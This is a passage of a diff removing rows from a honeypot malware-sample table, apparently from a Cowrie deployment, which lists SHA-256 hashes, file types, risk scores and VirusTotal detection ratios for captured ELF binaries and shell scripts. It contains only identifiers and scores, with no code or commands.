-| `97268f6b6a4daa31ec849f6535545badda10045bd584c3c14c885ec1e504af17` | Bash Script | `97268f6b6a4daa31...` | 55/100 | 🟡 MEDIUM | **13/75** 🔴 |
-| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
-| `97bd637e85a43b1dcf4a98b4a5d7fe041050ef56521f3a1944432092832a7e1d` | Bash Script | `97bd637e85a43b1d...` | 60/100 | 🟡 MEDIUM | Not in VT |
-| `97e5f3961aa9b4b9915df76d888f6ffee14b520871f1cc9ee1be21aed99b8d29` | ELF Binary (Linux executable) (ARM 32-bit) | `97e5f3961aa9b4b9...` | 64/100 | 🟡 MEDIUM | **35/75** 🔴 |
-| `980b0ae99d84941d6765e14ad1c353069d13e3b0c26aba82ee3db08c6885cb43` | Unknown binary | `980b0ae99d84941d...` | 32/100 | 🟢 LOW | **7/75** 🔴 |
-| `98792483aed3a9e0105cdaca1d5208916c07c45e0c46229e221a753fe3db0d30` | ELF Binary (Linux executable) (ARM 32-bit) | `98792483aed3a9e0...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
-| `99eb3db242fe9195e0d63f93ea0d498454841620b556a5f4d7a3aaa336842520` | ELF Binary (Linux executable) (x86-64 64-bit) | `99eb3db242fe9195...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
-| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
-| `9a64950f2bb05730b62ce2be6324e9be31efee78b581bdcb609249a9077b75cd` | ELF Binary (Linux executable) (MIPS 32-bit) | `9a64950f2bb05730...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
-| `9b3fde5cad3037c0ed14a74c1d9b339081b7eb53dbcb2057573834a9d37a4db3` | ELF Binary (Linux executable) (x86-64 64-bit) | `9b3fde5cad3037c0...` | 47/100 | 🟡 MEDIUM | **43/75** 🔴 |
-| `9c1706f25c502852bbc7b7bb9477392e17d9e7f6e33c9aec3a8a7ffa04a74a6c` | ELF Binary (Linux executable) (x86-64 64-bit) | `9c1706f25c502852...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
-| `9c67e4693e9c4cbcc2daadb3a09722977c4b5f90c31c7a5815d8be4ba371dc3f` | ELF Binary (Linux executable) (ARM 32-bit) | `9c67e4693e9c4cbc...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
-| `9cbbeb3f16791eb75f9dd1311268e2d6f584d442320b1ff453c5e12903b30f7b` | Unknown binary | `9cbbeb3f16791eb7...` | 55/100 | 🟡 MEDIUM | **38/75** 🔴 |
-| `9e2e7f57fa1f117b911b741e29fde7a53c047ed34ceb3ccef354db2bb4c38017` | ELF Binary (Linux executable) (MIPS 32-bit) | `9e2e7f57fa1f117b...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
-| `9e5b93d3095f577136717e6aae8b51fea50d66ef9123eedccfc23b8faebf6d6c` | ELF Binary (Linux executable) (x86-64 64-bit) | `9e5b93d3095f5771...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
-| `9f50ff1eb3f4d67a685791f56e38a9ec1d7368b1f16e42b603857672a3f448cf` | ELF Binary (Linux executable) (x86-64 64-bit) | `9f50ff1eb3f4d67a...` | 47/100 | 🟡 MEDIUM | **43/74** 🔴 |
-| `9f8d432eeedead73a1cd05de35b67816391585df5db0a1494d1806b56552edca` | Unknown binary | `9f8d432eeedead73...` | 0/100 | 🟢 LOW | Not in VT |
-| `a0deb39daf7dc464683eff03f1229aeefb952538ddfeb8101052d27caa6b27a8` | Unknown binary | `a0deb39daf7dc464...` | 0/100 | 🟢 LOW | Not in VT |
-| `a14be5443d928591e68c359b6573681329ef20cc700f08c1f3fcab2e70d0e944` | ELF Binary (Linux executable) (AArch64 64-bit) | `a14be5443d928591...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
-| `a151d3f4f2422531f30a843ffb35479596c86722bb103bdf8591105687f9b125` | ELF Binary (Linux executable) (x86-64 64-bit) | `a151d3f4f2422531...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
-| `a19db3d3c0a66608e9ab3652aaf2cfde36328111f9b3423d999e2ecdbc9e0ffe` | Unknown binary | `a19db3d3c0a66608...` | 0/100 | 🟢 LOW | 0/74 ✅ |
-| `a270f2f820b4174364705ae20819cc94e6d6537562eb0e6c0e5b81bbd9a3e456` | Unknown binary | `a270f2f820b41743...` | 0/100 | 🟢 LOW | 0/74 ✅ |
-| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/74 ✅ |
-| `a485511f190cca50a45098bddd4f45f7bdeb8467f12cf726d1659fa3326aa5be` | ELF Binary (Linux executable) (x86 32-bit) | `a485511f190cca50...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
-| `a48c84f1ce12eecb900ffee1e4c62338986eb771c873e58799fb4b3c3be7e26c` | ELF Binary (Linux executable) (x86 32-bit) | `a48c84f1ce12eecb...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
-| `a531f3e6224862abd00091c4955d535ace2bb886df53bdcd59c3a32b44c93629` | ELF Binary (Linux executable) (x86-64 64-bit) | `a531f3e6224862ab...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
-| `a62694b9dd36c5e9ebf016125df88a879c248383775584d67471dc3bd93fa68f` | ELF Binary (Linux executable) (ARM 32-bit) | `a62694b9dd36c5e9...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
-| `a68a4a508a26b77c50c15243812abfc34188cb2c2459fd97d8f0ff80277dbd02` | ELF Binary (Linux executable) (ARM 32-bit) | `a68a4a508a26b77c...` | 70/100 | 🔴 HIGH | Not in VT |
-| `a6ea67372e5b31bfd633d9745541577e9f3edb39f0eea75cf9679b632ca04908` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `a6ea67372e5b31bf...` | 53/100 | 🟡 MEDIUM | **34/75** 🔴 |
-| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
-| `a79c43ec48fe77d92a13790a15f177f61c7bb69e307c2270c22cb96405a274b5` | Bash Script | `a79c43ec48fe77d9...` | 58/100 | 🟡 MEDIUM | **21/75** 🔴 |
-| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
-| `a852f8958a507f7823fed1a0610df893b90758affeee2196fb9bddadbac06344` | ELF Binary (Linux executable) (x86-64 64-bit) | `a852f8958a507f78...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
-| `a85f91fefbe5bd7554306390160a8e55c02f502ab4ce88bb347fe17992d16f65` | Bash Script | `a85f91fefbe5bd75...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
-| `a8fbb5195a6e792c94f0945e11e3b4e07485f1f80cf3a87fad81dd6718ce609b` | ELF Binary (Linux executable) (x86-64 64-bit) | `a8fbb5195a6e792c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
-| `a9b88512ba552d7c5f283e2e1e070428b0f99db8c4c3b761a51aa2cb0af81015` | ELF Binary (Linux executable) (ARM 32-bit) | `a9b88512ba552d7c...` | 85/100 | 🔴 HIGH | **38/75** 🔴 |
-| `aa62e819aa0dac63aea2317a4c038cd88eefe2bc8502de24f56ab22262b29fe9` | Unknown binary | `aa62e819aa0dac63...` | 0/100 | 🟢 LOW | Not in VT |
-| `aa92fb3015e189bd59372a0fb43708d6127f936e7a4ede2c424d906023e0cfbe` | ELF Binary (Linux executable) (ARM 32-bit) | `aa92fb3015e189bd...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
-| `ad19b70c4e523ef24baf5e062d2200e139b619b56049219d41cd0397faff2c40` | Shell Script | `ad19b70c4e523ef2...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
-| `ad2c2ec738ac3b8e517ccc21b33167316434fb0cb27af247d4087a30820aa66a` | ELF Binary (Linux executable) (x86-64 64-bit) | `ad2c2ec738ac3b8e...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
-| `ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e` | Unknown binary | `ae8d459595257f2f...` | 0/100 | 🟢 LOW | 0/74 ✅ |
-| `af062bc5584636c98907b1c0b8e8e8632b860b9af789c023284f797303dc7e0c` | ELF Binary (Linux executable) (MIPS 32-bit) | `af062bc5584636c9...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
-| `b0215599b23e675722bc4fa164ddd1ae79d25fe38d3af14852798183425e8d30` | ELF Binary (Linux executable) (ARM 32-bit) | `b0215599b23e6757...` | 70/100 | 🔴 HIGH | Not in VT |
-| `b0cb295ee53ada54d9c76ceb66b2359dda58fd484f0155fab87f0e8813fffc1c` | Bash Script | `b0cb295ee53ada54...` | 61/100 | 🟡 MEDIUM | **29/75** 🔴 |
-| `b1382d28cde143d28367944962e5b5fc01161663e6c34913ffb1d48e9242f1f1` | ELF Binary (Linux executable) (AArch64 64-bit) | `b1382d28cde143d2...` | 30/100 | 🟢 LOW | Not in VT |
-| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |
-| `b16e15764b8bc06c5c3f9f19bc8b99fa48e7894aa5a6ccdad65da49bbf564793` | Unknown binary | `b16e15764b8bc06c...` | 0/100 | 🟢 LOW | 0/75 ✅ |
-| `b1b8308d882329d9d10fed76e51cbdcba10a899abeeda81cda4764f61a4804d1` | Unknown binary | `b1b8308d882329d9...` | 56/100 | 🟡 MEDIUM | **39/73** 🔴 |
-| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
-| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
-| `b238448228887716df7fd24b8545350de3764afa6b9fc8ee009aa137ee3655ad` | Unknown binary | `b238448228887716...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
-| `b25c3c740aead577c7c89894e80ee57c63d5acd78e62d789213fda023bfbaf3c` | Bash Script | `b25c3c740aead577...` | 74/100 | 🔴 HIGH | **36/75** 🔴 |
-| `b27ef08567ef869766b94747011a57bd187040fc114927b4b22d29a894bd03a1` | Bash Script | `b27ef08567ef8697...` | 57/100 | 🟡 MEDIUM | **19/73** 🔴 |
-| `b2e7ae5008d7e9f244ee9ac5fa9f276a8920fac0d968c40129a552e576ec8855` | Unknown binary | `b2e7ae5008d7e9f2...` | 0/100 | 🟢 LOW | 0/75 ✅ |
-| `b3d1bcd1f1b31cdf0b512001d257de143549dc7a8b955f0539fb9ab987de3dd2` | Unknown binary | `b3d1bcd1f1b31cdf...` | 54/100 | 🟡 MEDIUM | **37/76** 🔴 |
-| `b5147693ed4a8744cd3c32e2a2b8c6ec77acc6c8f0494b994398161a0ba009c5` | Shell Script | `b5147693ed4a8744...` | 42/100 | 🟡 MEDIUM | **5/75** 🔴 |
-| `b5497b2c9b6a0ea89688e018306536652081b57a916dba389fcb287703c17d86` | Bash Script | `b5497b2c9b6a0ea8...` | 72/100 | 🔴 HIGH | **31/75** 🔴 |
-| `b554626d55b7f6104c10217c4f3d61dec4228e803cf9ac4aa4051d6df681ce37` | Unknown binary | `b554626d55b7f610...` | 0/100 | 🟢 LOW | 0/75 ✅ |
-| `b593c1e45032da3554fa90659ee6ff0d816ce9cb2e5c59b83f3394bad845e31d` | ELF Binary (Linux executable) (AArch64 64-bit) | `b593c1e45032da35...` | 30/100 | 🟢 LOW | Not in VT |
-| `b5eec555aa0e07b1af33a0ec195a3fb195e1543339d22305fffbfa7e6a7b4381` | Bash Script | `b5eec555aa0e07b1...` | 65/100 | 🟡 MEDIUM | **39/75** 🔴 |
-| `b65b8dd173d10c56ee2193b6cda16d4ad0912de28ed98cf36d46023fcc78a793` | ELF Binary (Linux executable) (x86-64 64-bit) | `b65b8dd173d10c56...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
-| `b694d9c69417fe8514f2ab80e7f73af18e0653ca774e4eb14c74a3775d69cc4a` | Bash Script | `b694d9c69417fe85...` | 75/100 | 🔴 HIGH | **38/75** 🔴 |
-| `b6aa0f132c4e9f1456464d8a3fd55a309ed984077e020de89f4d9a8ffca84613` | Bash Script | `b6aa0f132c4e9f14...` | 63/100 | 🟡 MEDIUM | **33/75** 🔴 |
-| `b6be464cfa1aa3da36b87ef66352befa6a393c097d70deb68a19fe65fdb7955b` | Unknown binary | `b6be464cfa1aa3da...` | 0/100 | 🟢 LOW | Not in VT |
-| `b7a91c8f10e64ce50ed08bacb03930d1e21af876463f005ec4b11f3ed5f59adf` | ELF Binary (Linux executable) (MIPS 32-bit) | `b7a91c8f10e64ce5...` | 59/100 | 🟡 MEDIUM | **48/75** 🔴 |
-| `b92cccfed2e943993a36c44049ede7070d7bf0431b1907a48e8b2339422ea45c` | ELF Binary (Linux executable) (x86 32-bit) | `b92cccfed2e94399...` | 30/100 | 🟢 LOW | Not in VT |
-| `b992e0488abed5c19f215626dee38cc4b7b92b918ab194e276924a462aa97c3f` | ELF Binary (Linux executable) (ARM 32-bit) | `b992e0488abed5c1...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
-| `b9e7aa99fbaecf230300030d7fb27cd36114cc20b8d1b3a86306b89961314828` | Unknown binary | `b9e7aa99fbaecf23...` | 0/100 | 🟢 LOW | 0/74 ✅ |
-| `ba94350c0df51ffebfc75e2a721c46b6cbe63ae94450ba8e3cc58a319ed3f17b` | ELF Binary (Linux executable) (MIPS 32-bit) | `ba94350c0df51ffe...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
-| `ba9ca1f7995ad2647cab12e384331ceef0047331623371a974b88c4d51cda627` | Bash Script | `ba9ca1f7995ad264...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
-| `baf25a0c5669269aaa9ce31a1e827e7ef3870691538542a4ed21ff5f746aea11` | ELF Binary (Linux executable) (x86-64 64-bit) | `baf25a0c5669269a...` | 47/100 | 🟡 MEDIUM | **42/74** 🔴 |
-| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
-| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 73/100 | 🔴 HIGH | **33/74** 🔴 |
-| `bcfbd1d0c98844ddd4795a6df4e6431a494a0320c72413f188b50140cd30f506` | ELF Binary (Linux executable) (ARM 32-bit) | `bcfbd1d0c98844dd...` | 87/100 | 🔴 HIGH | **43/75** 🔴 |
-| `bd065fb5504cd702dba8d6216d836617021e25be3002dc0bc8db43402ba7af55` | ELF Binary (Linux executable) (MIPS 32-bit) | `bd065fb5504cd702...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
-| `be22794d92d557c69a9b8cb7436b8faf028d662d3f096e7f64ad3534059af6dc` | Bash Script | `be22794d92d557c6...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
-| `be24e3ff143568fc82e42ed4aeee92e3f6f58c5fe3c5bb442cf4b998c90463d2` | ELF Binary (Linux executable) (AArch64 64-bit) | `be24e3ff143568fc...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
-| `bf8b6b4846ad542696304b6d7e339d2c1425cd27aa61ac48df08c1de2dc4fabb` | ELF Binary (Linux executable) (x86-64 64-bit) | `bf8b6b4846ad5426...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
-| `bfb4fc546e7c80572a85cea5828f27621dcefb05a35c06685e43cc67f8d3a48b` | ELF Binary (Linux executable) (ARM 32-bit) | `bfb4fc546e7c8057...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
-| `c0523063abe84c4064e3fad4f5503f9a7ea500420ddf909ef4ae1979da45cc15` | Shell Script | `c0523063abe84c40...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
-| `c14491979811b95f025be5274feb90ff296bcd4438c99f9121c8a5a7de8c4274` | ELF Binary (Linux executable) (ARM 32-bit) | `c14491979811b95f...` | 56/100 | 🟡 MEDIUM | **41/75** 🔴 |
-| `c2069884a795c4bea4565f69acde008d23473d9b9b80fd76ca125a042d4cbe73` | ELF Binary (Linux executable) (AArch64 64-bit) | `c2069884a795c4be...` | 62/100 | 🟡 MEDIUM | **32/75** 🔴 |
-| `c4267b376a0d4b9153ea0d44d5986cd469bd36beb3fd16dfe79c12148c54b5d1` | ELF Binary (Linux executable) (x86-64 64-bit) | `c4267b376a0d4b91...` | 40/100 | 🟡 MEDIUM | **27/75** 🔴 |
-| `c68b566863960c84300388c0d900581b4b20fcc724ba9ad594b5b345ede13027` | ELF Binary (Linux executable) (ARM 32-bit) | `c68b566863960c84...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
-| `c749b54ba8d032787dc4c990d63ceca1e43cdf49aed74775931ad3a73558cf0e` | ELF Binary (Linux executable) (ARM 32-bit) | `c749b54ba8d03278...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
-| `c7cf5a8802506852d057798cfcd862f89af5a48f3239fbb3e905f112987f0cd6` | ELF Binary (Linux executable) (ARM 32-bit) | `c7cf5a8802506852...` | 45/100 | 🟡 MEDIUM | **37/73** 🔴 |
-| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
-| `c86da460d1d2ff18647ad8d99d08b029e69764f253a635f565d42c3f00555ee4` | ELF Binary (Linux executable) (ARM 32-bit) | `c86da460d1d2ff18...` | 85/100 | 🔴 HIGH | **39/75** 🔴 |
-| `c9f53c5a7971ce9053edf75583484635154ad09b791cfde914775d49045b1328` | ELF Binary (Linux executable) (x86-64 64-bit) | `c9f53c5a7971ce90...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
-| `cb0a5ec62de0f5ff9ce345842fffea94d6fce3fa763513850f96a226df337d66` | Unknown binary | `cb0a5ec62de0f5ff...` | 10/100 | 🟢 LOW | Not in VT |
-| `cb199f6560445b0ce5d20c34e06c5d04a4f56838c693b7c8d27476ee8855e35b` | Unknown binary | `cb199f6560445b0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
-| `cb1c3496202d7eb1803dc24fbecc332a245b52878084c1af23c2cca3ea52de09` | ELF Binary (Linux executable) (ARM 32-bit) | `cb1c3496202d7eb1...` | 85/100 | 🔴 HIGH | **39/75** 🔴 |
-| `cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8` | ELF Binary (Linux executable) (MIPS 32-bit) | `cc653189103bd14e...` | 64/100 | 🟡 MEDIUM | **37/75** 🔴 |
-| `cc87390d87be2b8377ffe32df42d30c56b46c0293ae7a126f466140ad2c2577f` | ELF Binary (Linux executable) (ARM 32-bit) | `cc87390d87be2b83...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
-| `ccb54c893ebd9a3818b1278f1a8863b6efbb7d637a7774a4a1f45d9c798ff4f7` | ELF Binary (Linux executable) (x86-64 64-bit) | `ccb54c893ebd9a38...` | 31/100 | 🟢 LOW | **3/75** 🔴 |
-| `ccdb70fd06c1c87dfcdfb05f5579bd6df127662a3e8a9cf0ceb2658701618c8b` | Bash Script | `ccdb70fd06c1c87d...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
-| `cd6dc7a2725ad8550e21cc16f471519e3e2abd32df2acb45804d5af6a078c44f` | ELF Binary (Linux executable) (RISC-V 64-bit) | `cd6dc7a2725ad855...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
-| `cd9655a77201f73e69953ec5b53f898de41983c1b4dcedd0c431955b9c20b241` | ELF Binary (Linux executable) (ARM 32-bit) | `cd9655a77201f73e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
-| `ce3cb467257e402122e4ab5f3f40fefcbdb4a662664659672a38967ee8aaaad0` | ELF Binary (Linux executable) (x86-64 64-bit) | `ce3cb467257e4021...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
-| `cef714f762fe668a28a3df64c4651571638939aebdb5939e8ccf23d8fbd3b008` | ELF Binary (Linux executable) (x86-64 64-bit) | `cef714f762fe668a...` | 37/100 | 🟢 LOW | **19/75** 🔴 |
-| `cf0b50b8b7a861c3490889683d857e50b54d0e4975678d58778bba800b589db8` | Shell Script | `cf0b50b8b7a861c3...` | 59/100 | 🟡 MEDIUM | **24/75** 🔴 |
-| `cfd7ad5fd929fbdef0af698ee1f7f1624ed46109a50125f7ab39b14bd84dfcac` | ELF Binary (Linux executable) (x86-64 64-bit) | `cfd7ad5fd929fbde...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
-| `d02f97bf8d46da0f09d12d4703053fca5b8f703f9a63b1b0a850f005c0f001c3` | ELF Binary (Linux executable) (MIPS 32-bit) | `d02f97bf8d46da0f...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
-| `d06f4d5357a82aa87794436260e6059397ac3d5e42d916ea8d898d34a9944bab` | Unknown binary | `d06f4d5357a82aa8...` | 0/100 | 🟢 LOW | 0/75 ✅ |
-| `d0f5cafd9fb6a363a8b97c84a3546f601a4ba10d49cdd7dae418288caec6940b` | ELF Binary (Linux executable) (x86 32-bit) | `d0f5cafd9fb6a363...` | 53/100 | 🟡 MEDIUM | **34/75** 🔴 |
-| `d1272c36897a7a76a35c07e47815c05a86b15138854438c104790e94d3e286b6` | ELF Binary (Linux executable) (x86 32-bit) | `d1272c36897a7a76...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
-| `d16bffbd3ba31504aea1fc01e66e29ad5927830ea5e2cc49369e82a7c68ec5c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `d16bffbd3ba31504...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
-| `d1cac82f44b54b0fd244a9e4122811e9ae108a197c7a65a20fd2e7552683e68e` | ELF Binary (Linux executable) (AArch64 64-bit) | `d1cac82f44b54b0f...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
-| `d44edce44672d1c036650973eb16ae1398e7ae936c3000e8a1342e49d97cec6d` | ELF Binary (Linux executable) (ARM 32-bit) | `d44edce44672d1c0...` | 64/100 | 🟡 MEDIUM | **35/75** 🔴 |
-| `d45935ba4fc0213cff236e68a531c80aef0e40c5149866ec8435130e512b5e65` | ELF Binary (Linux executable) (x86-64 64-bit) | `d45935ba4fc0213c...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
-| `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | Bash Script | `d46555af1173d22f...` | 71/100 | 🔴 HIGH | **28/75** 🔴 |
-| `d58ed4e7cf9ab3181cb59e18050cd9d4c41b334f0f07be08abe5bafed5c04069` | ELF Binary (Linux executable) (ARM 32-bit) | `d58ed4e7cf9ab318...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
-| `d59a4194ec66b508697d67d71b69f74f590e8a8bb346507075b3ded56854a374` | ELF Binary (Linux executable) (ARM 32-bit) | `d59a4194ec66b508...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
-| `d6f225d1c58a1ea7b4ee54afe26607b8f5d93c5ee3092e5ea4271ac7cc606890` | ELF Binary (Linux executable) (ARM 32-bit) | `d6f225d1c58a1ea7...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
-| `d70f917e35813a7ae323e6b2b539d6dbbfc3a3a6599f1fed93430b14ca08b141` | ELF Binary (Linux executable) (ARM 32-bit) | `d70f917e35813a7a...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
-| `d7f98e379c400c13340781ccb65017c000330824ea26680866b9d3e43d641721` | ELF Binary (Linux executable) (x86-64 64-bit) | `d7f98e379c400c13...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
-| `d8947327da3824306236e1d2a54316465f17147fa66ca7d113af1c3a62a1b709` | Bash Script | `d8947327da382430...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
-| `daeb4dddaefa21f1e952b3a3e606f91d7c95955db3458730d30a0a218d005246` | ELF Binary (Linux executable) (ARM 32-bit) | `daeb4dddaefa21f1...` | 85/100 | 🔴 HIGH | **38/75** 🔴 |
-| `daf823f9178b952c906e87afa36481de8978fcdeb3caf58bd1f0b397b1b706d2` | Shell Script | `daf823f9178b952c...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
-| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
-| `dbb7ebb960dc0d5a480f97ddde3a227a2d83fcaca7d37ae672e6a0a6785631e9` | ELF Binary (Linux executable) (AArch64 64-bit) | `dbb7ebb960dc0d5a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
-| `dbf5373811d5d3efdadfee71741e311c06c7677cf4953deb0bf98e20af604bed` | ELF Binary (Linux executable) (x86 32-bit) | `dbf5373811d5d3ef...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
-| `dc1d50597225317d5a9f93841f59c6f03ace0fbe217a23246c2e8be4841e49b8` | Shell Script | `dc1d50597225317d...` | 74/100 | 🔴 HIGH | **10/74** 🔴 |
-| `dc8a54933fa0427b2dfa4988fb42251ffaa4be83d27c769d4ea9f64b7a473d64` | ELF Binary (Linux executable) (x86-64 64-bit) | `dc8a54933fa0427b...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
-| `dcac02c71bd67e7ce708e2fad709059b817ebdde9796542ef16855de5c7b9a41` | ELF Binary (Linux executable) (ARM 32-bit) | `dcac02c71bd67e7c...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
-| `de37b9396eabaa51f9d6b5fd65622336d18f8ece75d068f371e685e057803dcf` | Unknown binary | `de37b9396eabaa51...` | 40/100 | 🟡 MEDIUM | Not in VT |
-| `de50ba349cff742b2515b561569f7ede1d7c37c0bccfc20e9c0cc58df2bc6401` | Unknown binary | `de50ba349cff742b...` | 0/100 | 🟢 LOW | Not in VT |
-| `dedf88d0d429ac2540973b826624f09397a1bf905aa48800188c0b0b8390df2d` | Shell Script | `dedf88d0d429ac25...` | 60/100 | 🟡 MEDIUM | Not in VT |
-| `df646ec1e142dbb41c6145d02aeda3322bd0b6addb1c338fa3a0116be7c9434f` | ELF Binary (Linux executable) (ARM 32-bit) | `df646ec1e142dbb4...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
-| `df78602fd918d9e393d5d8aaf01fa76e01b615578cdbf513589319932fe3099b` | Shell Script | `df78602fd918d9e3...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
-| `dfff309c7c3eb4d037cfab4db378e3ab91cba2cf30e74c1db0715a336c906b7b` | ELF Binary (Linux executable) (x86-64 64-bit) | `dfff309c7c3eb4d0...` | 31/100 | 🟢 LOW | **4/74** 🔴 |
-| `e08d30163fa26b3785d00b9a95456cda74db2e95935e6288a0ce8e53ffbae5f5` | Unknown binary | `e08d30163fa26b37...` | 0/100 | 🟢 LOW | Not in VT |
-| `e096bf51ba4bb7e4791166f7a35befb5a74b9ed2794f80ef7b913c6f16f7bd41` | Bash Script | `e096bf51ba4bb7e4...` | 74/100 | 🔴 HIGH | **35/75** 🔴 |
-| `e0e21cf140a749c8b5a192067c7d57bec0ca935c5cfbd600bc4e8f6dbb2416a9` | ELF Binary (Linux executable) (MIPS 32-bit) | `e0e21cf140a749c8...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
-| `e1a7aead734c79d37f42cbc8fac0f9fddfe6154ad8a892bb679fd9eb0fa49ee7` | ELF Binary (Linux executable) (x86-64 64-bit) | `e1a7aead734c79d3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
-| `e20f675c8df2bf4abbe8868e0cf7e16869473c9d4fe22e8b8e52d458e9880ac6` | ELF Binary (Linux executable) (x86-64 64-bit) | `e20f675c8df2bf4a...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
-| `e27e963b2b49cc758ddd65456d335d0183ca9ddc54349494d6a9f49d7c0603f4` | ELF Binary (Linux executable) (ARM 32-bit) | `e27e963b2b49cc75...` | 87/100 | 🔴 HIGH | **42/74** 🔴 |
-| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
